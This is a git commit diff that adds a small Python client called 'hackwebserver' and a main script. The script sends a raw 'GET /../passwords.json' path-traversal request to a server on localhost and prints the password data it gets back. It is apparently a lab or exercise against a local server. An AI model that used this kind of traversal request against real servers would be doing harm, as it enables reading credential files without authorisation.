36c68fd056a623909c5b094ffd4046ea00c3d721
Eden <eden.refael@auroralabs.com>
2022-09-10 22:45:12 +0300

    changed the name of the directories

---
+++ client/python client/hackwebserver.py
@@ -0,0 +1,7 @@
+import socket
+
+def web_request(req):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('localhost', 8085))
+    s.send(req)
+    return s.recv(1024)
--- client/python client/main.py
+++ client/python client/main.py
@@ -1,12 +1,8 @@
-
-
-
-
-
-def print_hi(name):
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
+import hackwebserver as hws
+import json
 
 
 if __name__ == '__main__':
-    print_hi('PyCharm')
-
+    st1 = (hws.web_request(b'GET /../passwords.json HTTP/1.1')).decode("utf-8")
+    st2 = '\n'.join(st1.split('\n')[1:])
+    print(json.loads(st2))
